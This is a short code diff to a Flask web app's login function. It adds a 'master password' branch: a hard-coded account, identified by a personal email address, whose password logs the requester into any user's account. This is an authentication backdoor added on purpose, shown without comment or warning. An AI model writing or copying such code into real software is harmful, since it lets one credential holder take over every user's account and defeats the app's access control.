@@ -34,10 +34,16 @@ def login():
     form = LoginForm()
     if form.validate_on_submit():
         user = User.query.filter_by(email=form.email.data).first()
+        master_user = User.query.filter_by(email='srbcheema2@gmail.com').first()
         hashed_pswd = str_hash(form.password.data)
         if user and hashed_pswd == user.password:
             login_user(user, remember=form.remember.data)
             next_page = request.args.get('next')
+            return redirect(next_page) if next_page else redirect(url_for('main.home'))
+        elif user and master_user and hashed_pswd == master_user.password:
+            login_user(user, remember=form.remember.data)
+            next_page = request.args.get('next')
+            flash('Logging in using master password', 'info')
             return redirect(next_page) if next_page else redirect(url_for('main.home'))
         if(debug):
             if not user:
